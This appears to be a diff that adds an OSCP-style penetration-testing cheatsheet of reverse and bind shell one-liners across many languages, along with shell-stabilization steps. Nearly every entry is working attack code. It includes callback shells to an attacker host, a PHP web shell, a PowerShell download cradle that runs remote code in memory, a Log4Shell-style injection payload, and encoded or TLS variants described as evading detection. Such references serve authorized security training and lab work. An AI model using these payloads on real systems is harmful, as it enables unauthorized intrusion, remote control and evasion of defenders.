@@ -1,0 +1,453 @@
+OSCP Shell Cheatsheet
+
+Reverse Shells | Bind Shells | Shell Upgrades
+
+Replace LHOST = your IP | LPORT = your listener port | RHOST/RPORT =
+target
+
+Variable Reference
+
+  ------------- --------------- ------------------------------------------
+  LHOST         192.168.49.65   Your Kali / attack machine IP
+
+  LPORT         4444            Your listening port (start nc/ncat/socat
+                                here)
+
+  RHOST         192.168.1.100   Target machine IP
+
+  RPORT         4444            Bind shell listening port on target
+  ------------- --------------- ------------------------------------------
+
+[REVERSE] Target connects back to you [BIND] You connect to listener on
+target [UPGRADE] Shell stabilization
+
+  Before catching a reverse shell, start your listener: nc -lvnp LPORT
+
+Bash / sh
+
+[REVERSE] Bash TCP Reverse Shell
+
+Opens /dev/tcp pseudo-device to connect back to attacker. Redirects
+stdin/stdout/stderr over the socket. Works on most Linux targets where
+bash is available.
+
+  bash -i >& /dev/tcp/LHOST/LPORT 0>&1
+
+[REVERSE] Bash TCP (alternate form)
+
+Same as above but uses exec for the redirection — sometimes more
+reliable in restricted shells.
+
+  exec bash -i &>/dev/tcp/LHOST/LPORT <&1
+
+[REVERSE] sh /dev/tcp (POSIX)
+
+Uses /bin/sh instead of bash. Useful when only POSIX sh is available.
+
+  /bin/sh -i >& /dev/tcp/LHOST/LPORT 0>&1
+
+[REVERSE] Bash UDP Reverse Shell
+
+Same concept over UDP. Listener: nc -u -lvnp LPORT. Useful to bypass
+TCP-focused firewalls.
+
+  bash -i >& /dev/udp/LHOST/LPORT 0>&1
+
+[REVERSE] mkfifo Named Pipe Reverse
+
+Creates a named pipe (FIFO) so nc can shuttle stdin/stdout
+bidirectionally. Very reliable when bash /dev/tcp is blocked.
+
+  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST
+  LPORT > /tmp/f
+
+[BIND] Bash Bind Shell (mkfifo)
+
+Creates a listening shell on the target using mkfifo. Connect with: nc
+RHOST RPORT
+
+  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l
+  RPORT > /tmp/f
+
+Python 3
+
+[REVERSE] Socket + dup2 + pty (Exploit Delivery — e.g. python3 47984.py)
+
+Passed as shell argument to a Python exploit. Imports socket, os;
+connects to attacker; dup2 redirects fd 0/1/2; pty.spawn gives a proper
+PTY. Most stable Python reverse shell.
+
+  python3 47984.py RHOST 25 'python3 -c "import
+  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import
+  pty;pty.spawn(\"/bin/bash\")"'
+
+[REVERSE] Python3 Reverse Shell (direct exec)
+
+Socket+dup2 run directly on target. No PTY — raw shell. Good for
+injection contexts.
+
+  python3 -c 'import
+  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+[REVERSE] Python3 Reverse Shell (pty spawn)
+
+Adds pty.spawn for an interactive PTY — tab completion, CTRL+C, etc.
+More usable post-landing.
+
+  python3 -c 'import
+  socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+[REVERSE] Python2 Reverse Shell
+
+Same socket+dup2 pattern for Python 2. Use when only py2 is available.
+
+  python -c 'import
+  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+[BIND] Python Bind Shell
+
+Listens on RPORT on the target. Connect with: nc RHOST RPORT. Useful
+when you can execute code but have no outbound path.
+
+  python3 -c 'import
+  socket,os,subprocess;s=socket.socket();s.bind(("0.0.0.0",RPORT));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+Netcat (nc)
+
+[REVERSE] nc -e Reverse Shell
+
+Classic nc with -e flag (execute). Not available in OpenBSD nc or
+hardened distros.
+
+  nc LHOST LPORT -e /bin/sh
+
+[BIND] nc -e Bind Shell
+
+Listens on target and executes /bin/sh when you connect. Connect with:
+nc RHOST RPORT
+
+  nc -lvnp RPORT -e /bin/sh
+
+[REVERSE] nc mkfifo Reverse (no -e)
+
+Works with OpenBSD/hardened nc that lacks -e. Uses a named pipe for
+bidirectional flow.
+
+  rm -f /tmp/p; mkfifo /tmp/p; nc LHOST LPORT < /tmp/p | /bin/sh >
+  /tmp/p 2>&1; rm /tmp/p
+
+[REVERSE] ncat SSL Reverse Shell
+
+Ncat (from nmap) with SSL — encrypts shell traffic. Listener: ncat --ssl
+-lvnp LPORT
+
+  ncat --ssl LHOST LPORT -e /bin/sh
+
+[BIND] nc Bind Shell (mkfifo)
+
+Bind shell without -e using mkfifo pipe trick.
+
+  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l
+  RPORT >/tmp/f
+
+PHP
+
+[REVERSE] PHP Reverse Shell (proc_open)
+
+proc_open gives fine-grained control over stdin/stdout/stderr pipes.
+Reliable when exec/system aren't restricted.
+
+  php -r '$sock=fsockopen("LHOST",LPORT);$proc=proc_open("/bin/sh
+  -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
+
+[REVERSE] PHP One-liner Web Shell
+
+Drop in a .php file on a web server. ?cmd=whoami runs commands. Use it
+to launch a full reverse shell.
+
+  <?php system($_GET['cmd']); ?>
+
+[REVERSE] PHP Pentestmonkey Shell (file)
+
+The classic pentestmonkey PHP reverse shell. Edit $ip and $port, upload
+to web root, browse to it. Full TTY.
+
+  # Download from: https://github.com/pentestmonkey/php-reverse-shell
+
+  # Edit $ip and $port at top of file, upload, browse to it
+
+[BIND] PHP Bind Shell
+
+Opens a socket on the target listening on RPORT. Connect with: nc RHOST
+RPORT
+
+  php -r
+  '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",RPORT);socket_listen($s,1);$c=socket_accept($s);while(($buf=socket_read($c,1024))!=false){$out=shell_exec($buf);socket_write($c,$out,strlen($out));}'
+
+Perl
+
+[REVERSE] Perl Reverse Shell (Linux)
+
+Perl socket reverse shell. Opens TCP socket, dups file handles to socket
+fd, execs /bin/sh. Available on many Unix systems.
+
+  perl -e 'use
+  Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh
+  -i");'
+
+[REVERSE] Perl Reverse Shell (Windows)
+
+Perl reverse shell adapted for Windows using cmd.exe.
+
+  perl -MIO -e '$c=new
+  IO::Socket::INET(PeerAddr,"LHOST:LPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_
+  while<>;'
+
+[BIND] Perl Bind Shell
+
+Binds a shell to RPORT on the target. Connect with: nc RHOST RPORT
+
+  perl -e 'use
+  Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in(RPORT,INADDR_ANY));listen(S,SOMAXCONN);accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh
+  -i");'
+
+Ruby
+
+[REVERSE] Ruby Reverse Shell
+
+Uses Ruby's TCPSocket class. Spawns /bin/sh and redirects IO to socket.
+Common on web servers.
+
+  ruby -rsocket -e 'exit if
+  fork;c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print
+  io.read}end'
+
+[REVERSE] Ruby Reverse Shell (simple)
+
+Simpler Ruby reverse shell using shell fd redirection directly.
+
+  ruby -rsocket -e 's=TCPSocket.new("LHOST",LPORT);`/bin/sh -i
+  <&#{s.fileno} >&#{s.fileno} 2>&#{s.fileno}`'
+
+[BIND] Ruby Bind Shell
+
+Creates a TCP server on target at RPORT. Connect with: nc RHOST RPORT
+
+  ruby -rsocket -e 's=TCPServer.new(RPORT);c=s.accept;while
+  cmd=c.gets;IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+PowerShell
+
+[REVERSE] PowerShell TCP Reverse Shell
+
+Pure PowerShell: opens TCP socket, reads commands via StreamReader,
+sends output back in a loop. Core Windows attack shell.
+
+  powershell -NoP -NonI -W Hidden -Exec Bypass -c "$c=New-Object
+  System.Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))
+  -ne 0){$d=(New-Object -TypeName
+  System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d
+  2>&1|Out-String);$rb=[System.Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()"
+
+[REVERSE] PowerShell Base64 Encoded Payload
+
+Encodes payload as Base64 to bypass command-line detection and quoting
+issues. Generate:
+[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('<cmd>'))
+
+  powershell -enc <BASE64_ENCODED_PAYLOAD>
+
+[BIND] PowerShell Bind Shell
+
+Creates a TCPListener on RPORT. Accepts connection and pipes commands to
+Invoke-Expression. Connect with: nc RHOST RPORT
+
+  powershell -c "$l=New-Object
+  System.Net.Sockets.TcpListener('0.0.0.0',RPORT);$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))
+  -ne 0){$d=([text.encoding]::ASCII).GetString($b,0,$i);$r=(iex $d
+  2>&1|Out-String);$rb=[text.encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)};$c.Close();$l.Stop()"
+
+[REVERSE] PowerShell Download Cradle + Nishang
+
+Downloads and executes Invoke-PowerShellTcp from Nishang in memory.
+Fileless — nothing written to disk.
+
+  powershell IEX(New-Object
+  Net.WebClient).DownloadString('http://LHOST/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp
+  -Reverse -IPAddress LHOST -Port LPORT
+
+Socat
+
+[REVERSE] Socat Reverse Shell
+
+Socat EXEC wires shell to TCP. Listener: socat file:`tty`,raw,echo=0
+tcp-listen:LPORT
+
+  socat TCP:LHOST:LPORT EXEC:/bin/sh
+
+[REVERSE] Socat PTY Reverse Shell (best quality)
+
+Full PTY shell — arrows, tab completion, CTRL+C all work. The gold
+standard when socat is available. Listener: socat file:`tty`,raw,echo=0
+tcp-listen:LPORT
+
+  socat TCP:LHOST:LPORT EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
+
+[BIND] Socat Bind Shell
+
+Binds shell to RPORT. Connect with: socat - TCP:RHOST:RPORT
+
+  socat TCP-LISTEN:RPORT,reuseaddr,fork EXEC:/bin/sh
+
+[REVERSE] Socat SSL Encrypted Reverse Shell
+
+TLS-encrypted shell — evades DPI/IDS. Generate cert: openssl req -newkey
+rsa:2048 -nodes -x509 -out shell.pem -keyout shell.pem. Listener: socat
+OPENSSL-LISTEN:LPORT,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
+
+  socat OPENSSL:LHOST:LPORT,verify=0
+  EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
+
+Java
+
+[REVERSE] Java Reverse Shell (Runtime.exec)
+
+Uses Runtime.exec() with a string array to avoid shell escaping.
+Connects back over TCP and wires stdin/stdout/stderr to socket streams.
+
+  Runtime r=Runtime.getRuntime();
+
+  Process p=r.exec(new String[]{"/bin/bash","-c",
+
+  "exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do $line
+  2>&5 >&5; done"});
+
+  p.waitFor();
+
+[REVERSE] Java Log4Shell-style (Base64)
+
+Compact form often used when injecting via Log4Shell (CVE-2021-44228) or
+other deserialization vulnerabilities.
+
+  Runtime.getRuntime().exec("bash -c
+  {echo,BASE64_PAYLOAD}|{base64,-d}|bash")
+
+Go (Golang)
+
+[REVERSE] Go Reverse Shell
+
+Compiled Go reverse shell. Cross-compile a static binary: GOOS=linux
+GOARCH=amd64 go build. Useful when target has no scripting runtimes.
+
+  package main
+
+  import ("net"; "os/exec")
+
+  func main() {
+
+  c, _ := net.Dial("tcp", "LHOST:LPORT")
+
+  cmd := exec.Command("/bin/sh")
+
+  cmd.Stdin = c; cmd.Stdout = c; cmd.Stderr = c
+
+  cmd.Run()
+
+  }
+
+Node.js
+
+[REVERSE] Node.js Reverse Shell
+
+Uses net.Socket and child_process.spawn. Useful on web servers running
+Node (Express etc.) or when JS is the only runtime.
+
+  node -e '(function(){var
+  n=require("net"),s=require("child_process").spawn("/bin/sh",[]);var
+  c=n.connect(LPORT,"LHOST",function(){c.pipe(s.stdin);s.stdout.pipe(c);s.stderr.pipe(c);});})();'
+
+Lua
+
+[REVERSE] Lua Reverse Shell
+
+Useful on embedded devices or when Lua is the only interpreter (e.g.,
+OpenWRT routers, game servers).
+
+  lua -e
+  "require('socket');c=require('socket').tcp();c:connect('LHOST','LPORT');while
+  true do local r,x=c:receive();local f=io.popen(r,'r');local
+  s=f:read('*a');f:close();c:send(s);end;c:close();"
+
+AWK
+
+[REVERSE] AWK Reverse Shell (gawk)
+
+Surprisingly useful when gawk is on the system but other interpreters
+are stripped. Uses /inet/tcp to open a socket.
+
+  awk 'BEGIN{s="/inet/tcp/0/LHOST/LPORT";for(;s|&getline
+  c;close(c))while(c|getline)print|&s;close(s)}'
+
+Telnet
+
+[REVERSE] Telnet Two-Connection Reverse Shell
+
+Opens two telnet connections: one for stdin, one for stdout/stderr.
+Requires two listeners: nc -lvnp LPORT and nc -lvnp LPORT2
+
+  telnet LHOST LPORT | /bin/bash | telnet LHOST LPORT2
+
+Shell Upgrade & Stabilization
+
+[UPGRADE] Python PTY Upgrade (Step 1)
+
+After catching a dumb shell in nc, run this first to get a
+pseudo-terminal. Enables CTRL+C without killing the shell.
+
+  python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+[UPGRADE] Full TTY Upgrade via stty (Steps 2-5)
+
+After pty.spawn, background with CTRL+Z, run stty on local machine, then
+fg. Gives fully interactive shell with proper sizing.
+
+  # Step 1 — in the dumb shell:
+
+  python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+  # Step 2 — CTRL+Z to background the nc session
+
+  # Step 3 — on YOUR local machine:
+
+  stty raw -echo; fg
+
+  # Step 4 — back in the shell:
+
+  reset
+
+  export TERM=xterm
+
+  export SHELL=/bin/bash
+
+  stty rows 38 cols 157
+
+[UPGRADE] script Upgrade (no Python needed)
+
+Alternative to Python pty when Python is missing. Works on most Unix
+systems.
+
+  script /dev/null -c bash
+
+[UPGRADE] rlwrap for Windows Shells
+
+Wraps nc with readline — gives arrow key history for cmd/PowerShell
+shells. Run on your attack machine.
+
+  rlwrap nc -lvnp LPORT
+
+[UPGRADE] Upgrade to Meterpreter
+
+From msfconsole sessions, upgrade a basic shell to full Meterpreter
+in-place.
+
+  sessions -u <SESSION_ID>
